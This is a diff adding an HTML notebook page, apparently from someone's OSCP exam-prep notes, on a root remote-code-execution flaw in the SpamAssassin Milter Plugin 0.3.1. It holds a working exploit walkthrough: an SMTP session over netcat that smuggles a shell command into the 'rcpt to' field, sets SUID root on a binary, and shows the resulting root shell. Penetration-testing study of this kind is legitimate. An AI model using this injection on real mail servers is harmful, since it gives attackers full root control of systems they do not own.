@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>SpamAssassin</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># SpamAssassin</h1></strong><br /><br /><strong><h2>## SpamAssassin Milter Plugin 0.3.1 - RCE</h2></strong><br /><a href="https://www.exploit-db.com/exploits/11662">https://www.exploit-db.com/exploits/11662</a><br /><br /><strong>Examples</strong><br />• oscp 10.3.3.42 - Mario<br /><br />You have code execution as root, so do anything you want.<br /><div class="codebox"><div class="codebox">mario@mario:/tmp$&nbsp;nc&nbsp;localhost&nbsp;25<br />220&nbsp;lenny&nbsp;ESMTP&nbsp;Postfix&nbsp;(Debian/GNU)<br />mail&nbsp;from:&nbsp;me@me.com<br />250&nbsp;2.1.0&nbsp;Ok<br />rcpt&nbsp;to:&nbsp;root+:&quot;|&lt;command&nbsp;here&gt;&quot;<br />250&nbsp;2.1.5&nbsp;Ok</div></div><strong><br /></strong><br />Example below uses a shell-spawning binary and changes ownership to root, adds SUID bit etc. to get a root shell.<br /><div class="codebox"><div class="codebox">mario@mario:/tmp$&nbsp;nc&nbsp;localhost&nbsp;25<br />220&nbsp;lenny&nbsp;ESMTP&nbsp;Postfix&nbsp;(Debian/GNU)<br />mail&nbsp;from:&nbsp;me@me.com<br />250&nbsp;2.1.0&nbsp;Ok<br />rcpt&nbsp;to:&nbsp;root+:&quot;|chown&nbsp;root:root&nbsp;/tmp/rootme;&nbsp;chmod&nbsp;777&nbsp;/tmp/rootme;&nbsp;chmod&nbsp;+s&nbsp;/tmp/rootme&quot;<br />250&nbsp;2.1.5&nbsp;Ok<br />^C<br />mario@mario:/tmp$&nbsp;ls&nbsp;-alh<br />total&nbsp;24K<br />drwxrwxrwt&nbsp;&nbsp;3&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;2020-02-26&nbsp;11:10&nbsp;.<br />drwxr-xr-x&nbsp;21&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;2010-03-08&nbsp;02:40&nbsp;..<br />-rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;2020-02-26&nbsp;11:01&nbsp;foo<br />-rwsrwsrwx&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;6.5K&nbsp;2020-02-26&nbsp;11:10&nbsp;rootme<br />-rw-rw-rw-&nbsp;&nbsp;1&nbsp;mario&nbsp;mario&nbsp;&nbsp;&nbsp;68&nbsp;2020-02-26&nbsp;11:10&nbsp;rootme.c<br />drwx------&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;2016-08-23&nbsp;01:56&nbsp;vmware-root<br />mario@mario:/tmp$&nbsp;./rootme<br />sh-3.2#&nbsp;id<br />uid=0(root)&nbsp;gid=0(root)&nbsp;groups=1001(mario)</div></div></div>
+</body>
+</html>
